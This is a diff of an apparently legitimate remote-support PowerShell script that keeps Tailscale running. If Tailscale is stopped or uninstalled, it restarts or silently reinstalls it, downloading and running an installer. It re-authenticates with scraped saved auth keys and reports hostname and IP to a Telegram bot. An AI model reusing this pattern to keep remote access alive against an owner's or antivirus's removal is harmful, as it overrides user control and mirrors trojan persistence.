@@ -22,47 +22,130 @@ if(-not (Test-Path (Join-Path $dir 'unattended.done'))){
   }
 }
 
-# 0c) Tailscale RECOVERY: if installed but logged out / blocked (e.g. antivirus
-#     interrupted it), log back in automatically. The key is read from where the
-#     setup already saved it on THIS machine - never stored in this public file.
-$tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
-if($tsExe){
-  Remove-Item (Join-Path $dir 'ts-missing.flag') -EA 0
-  $st = (& $tsExe status 2>&1 | Out-String)
-  if($st -match 'logged out' -or $st -match 'NoState' -or $st -match 'network map' -or $st -match 'Logged out' -or $st -match 'Stopped'){
-    $key=''
-    foreach($d in @("$env:ProgramData\rsupport","$env:ProgramData\RemoteSupport","$env:ProgramData\Tailscale")){
-      if(-not $key -and (Test-Path $d)){
-        foreach($f in (Get-ChildItem $d -Recurse -File -EA 0)){
-          $c = Get-Content $f.FullName -Raw -EA 0
-          $m = [regex]::Match([string]$c,'tskey-auth-[A-Za-z0-9\-]+')
-          if($m.Success){ $key=$m.Value; break }
-        }
+# 0c) Tailscale RECOVERY (HARDENED): handles 3 failure modes now, not just "logged out":
+#       (a) exe present, service stopped/disabled           -> restart + force Automatic
+#       (b) exe present, logged out / blocked                -> re-auth with saved key
+#       (c) exe or service GONE entirely (removed/uninstalled)-> reinstall (winget, then
+#           direct pkgs.tailscale.com download as fallback - same method proven in
+#           SETUP-SSH-READY.bat) then re-auth
+#     This matters because a stopped/missing Tailscale can be innocent (AV) OR
+#     deliberate (someone with unauthorized remote access disabling it to cut off
+#     the legit channel). Either way the client must self-heal back online.
+function TG-Send($msg){
+  $tg = Join-Path $dir 'tg.txt'
+  if(Test-Path $tg){
+    $tk='';$tc=''
+    foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
+    if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=$msg} | Out-Null }catch{} }
+  }
+}
+function TS-FindKey(){
+  $key=''
+  foreach($d in @("$env:ProgramData\rsupport","$env:ProgramData\RemoteSupport","$env:ProgramData\Tailscale")){
+    if(-not $key -and (Test-Path $d)){
+      foreach($f in (Get-ChildItem $d -Recurse -File -EA 0)){
+        $c = Get-Content $f.FullName -Raw -EA 0
+        $m = [regex]::Match([string]$c,'tskey-auth-[A-Za-z0-9\-]+')
+        if($m.Success){ $key=$m.Value; break }
       }
     }
+  }
+  return $key
+}
+function TS-FindExe(){
+  return (@('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1)
+}
+
+$tsExe = TS-FindExe
+$tsSvc = Get-Service Tailscale -EA 0
+
+# (a) exe present but service not running/disabled - force it back, every cycle
+if($tsExe -and (-not $tsSvc -or $tsSvc.Status -ne 'Running')){
+  try{ Set-Service -Name Tailscale -StartupType Automatic -EA 0 }catch{}
+  $wasStopped = $true
+  try{ Start-Service Tailscale -EA Stop }catch{}
+  Start-Sleep -Seconds 2
+  $tsSvc = Get-Service Tailscale -EA 0
+  if($tsSvc -and $tsSvc.Status -eq 'Running'){
+    $flag = Join-Path $dir 'ts-svc-stopped.flag'
+    if(-not (Test-Path $flag)){
+      TG-Send ("Tailscale service was stopped/disabled on "+$env:COMPUTERNAME+" - restarted automatically.")
+      Set-Content $flag '1' -Encoding ascii
+    }
+  } else {
+    # couldn't even start the service - treat as "effectively gone", fall through to reinstall below
+    $tsExe = $null
+  }
+} else {
+  Remove-Item (Join-Path $dir 'ts-svc-stopped.flag') -EA 0
+}
+
+if($tsExe){
+  Remove-Item (Join-Path $dir 'ts-missing.flag') -EA 0
+  Remove-Item (Join-Path $dir 'ts-reinstall.flag') -EA 0
+  # (b) installed+running but logged out / blocked -> re-auth
+  $st = (& $tsExe status 2>&1 | Out-String)
+  if($st -match 'logged out' -or $st -match 'NoState' -or $st -match 'network map' -or $st -match 'Logged out' -or $st -match 'Stopped'){
+    $key = TS-FindKey
     if($key){
       Start-Service Tailscale -EA 0
       & $tsExe up --authkey $key --unattended --accept-risk=all 2>$null
-      $tg = Join-Path $dir 'tg.txt'
-      if(Test-Path $tg){
-        $tk='';$tc=''
-        foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
-        if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale was down on "+$env:COMPUTERNAME+" (antivirus/logout) - auto-reconnected.")} | Out-Null }catch{} }
-      }
+      TG-Send ("Tailscale was down on "+$env:COMPUTERNAME+" (logged out/blocked) - auto-reconnected.")
     }
   }
 }
 else{
-  # Tailscale .exe is gone - antivirus likely deleted it. Alert once (needs manual allow).
-  $mk = Join-Path $dir 'ts-missing.flag'
-  if(-not (Test-Path $mk)){
-    $tg = Join-Path $dir 'tg.txt'
-    if(Test-Path $tg){
-      $tk='';$tc=''
-      foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
-      if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale MISSING on "+$env:COMPUTERNAME+" - antivirus may have removed it. Allow Tailscale in the antivirus, then re-run setup.")} | Out-Null }catch{} }
+  # (c) exe truly gone (never installed, antivirus deleted it, or someone uninstalled it).
+  #     Reinstall at most once per ~4 hours (cooldown flag) so a broken machine doesn't
+  #     hammer winget/the download every single 15-min cycle.
+  $cd = Join-Path $dir 'ts-reinstall.flag'
+  $tryNow = $true
+  if(Test-Path $cd){
+    try{
+      $last = Get-Date (Get-Content $cd -Raw -EA Stop).Trim()
+      if(((Get-Date) - $last).TotalHours -lt 4){ $tryNow = $false }
+    }catch{}
+  }
+  if($tryNow){
+    Set-Content $cd ((Get-Date).ToString('o')) -Encoding ascii
+    winget install --id Tailscale.Tailscale --silent --accept-package-agreements --accept-source-agreements 2>$null | Out-Null
+    $tsExe = TS-FindExe
+    if(-not $tsExe){
+      try{
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        $setupExe = Join-Path $env:TEMP 'ts-setup.exe'
+        Invoke-WebRequest 'https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe' -OutFile $setupExe -UseBasicParsing
+        Start-Process $setupExe -ArgumentList '/quiet' -Wait
+        Start-Sleep -Seconds 5
+        Remove-Item $setupExe -Force -EA 0
+      }catch{}
+      $tsExe = TS-FindExe
     }
-    Set-Content $mk '1' -Encoding ascii
+    if($tsExe){
+      Start-Service Tailscale -EA 0
+      try{ Set-Service -Name Tailscale -StartupType Automatic -EA 0 }catch{}
+      & $tsExe up --unattended --accept-risk=all 2>$null
+      $key = TS-FindKey
+      if($key){
+        & $tsExe up --authkey $key --unattended --accept-risk=all 2>$null
+        Start-Sleep -Seconds 3
+        $ip = (& $tsExe ip -4 2>$null)
+        if($ip){
+          TG-Send ("Tailscale was MISSING on "+$env:COMPUTERNAME+" - reinstalled and reconnected automatically. IP: "+$ip)
+          Remove-Item (Join-Path $dir 'ts-missing.flag') -EA 0
+        } else {
+          TG-Send ("Tailscale reinstalled on "+$env:COMPUTERNAME+" but could not connect - the saved key may be expired. Needs a manual re-run of setup.")
+        }
+      } else {
+        TG-Send ("Tailscale reinstalled on "+$env:COMPUTERNAME+" but no saved login key was found locally - needs a manual re-run of setup to re-authenticate.")
+      }
+    } else {
+      $mk = Join-Path $dir 'ts-missing.flag'
+      if(-not (Test-Path $mk)){
+        TG-Send ("Tailscale MISSING on "+$env:COMPUTERNAME+" - auto-reinstall was attempted and failed (no internet, or blocked by antivirus/policy). Allow Tailscale in the antivirus and re-run setup manually.")
+        Set-Content $mk '1' -Encoding ascii
+      }
+    }
   }
 }
 
